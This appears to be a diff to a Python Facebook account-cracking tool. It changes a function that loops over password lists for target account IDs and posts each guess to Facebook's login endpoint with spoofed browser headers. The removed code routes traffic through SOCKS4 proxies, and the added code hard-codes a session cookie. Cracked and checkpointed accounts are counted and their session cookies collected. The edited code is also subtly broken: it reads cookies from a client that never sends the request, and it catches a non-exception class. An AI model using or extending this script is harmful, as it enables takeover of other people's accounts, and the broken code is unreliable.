@@ -1209,51 +1209,42 @@ def m3(ids,pwv):
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    session = requests.Session()
     ua = ua_valid()
     warna = random.choice(my_color)
-    nip=random.choice(proxsi)
-    proxs= {'http': 'socks4://'+nip}
-    DOMAIN = ("m","business","mbasic")
-    fb= random.choice(DOMAIN)
     uger = random.choice(ugrn)
+    session = httpx.Client()
     try:
         for pas in pwv:
-            free_fb = session.get('https://m.facebook.com').text
-            info={
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":ids,
-            "pass":pas,
-            "login":"Log In"}
-            update={
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,hi;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': f'https://{fb}.facebook.com',
-            'priority': 'u=0, i',
-            'referer': f'https://{fb}.facebook.com/?locale2=en_GB&_rdr',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-            'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-            'viewport-width': '885',}
-            session.post(f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',data=info,headers=update,proxies=proxs,allow_redirects=False).text
+            conn = http.client.HTTPSConnection('mbasic.facebook.com')
+            headers = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,hi;q=0.8,bn;q=0.7',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    'cookie': 'datr=j16PZrEZMfeHUCccY-qTrVKD; sb=j16PZn2Au1zrbkc__J5S_PVB; ps_n=1; ps_l=1; wd=885x773; fr=0eTIeUQ39MmUdOUMK..Bmj16w..AAA.0.0.Bmp31y.AWUBr74jQqw',
+    'dpr': '1',
+    'origin': 'https://mbasic.facebook.com',
+    'priority': 'u=0, i',
+    'referer': 'https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.72", "Chromium";v="127.0.6533.72"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    'viewport-width': '885',}
+            conn.request(
+    'POST',
+    '/login/device-based/regular/login/?refsrc=deprecated&lwv=100',
+    f'lsd=AVp-E35fJm4&jazoest=2818&m_ts=1722252731&li=un2nZmDzrsc7LWsoef_lNJ9l&try_number=0&unrecognized_tries=0&email={ids}&pass={pas}&login=Log+in&bi_xrwh=0',
+    headers)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
@@ -1280,7 +1271,7 @@ def m3(ids,pwv):
                 continue
             time.sleep(0.01)
         loop+=1
-    except requests.exceptions.ConnectionError:
+    except http.client.HTTPSConnection:
         time.sleep(7)
     except Exception as e:
         pass
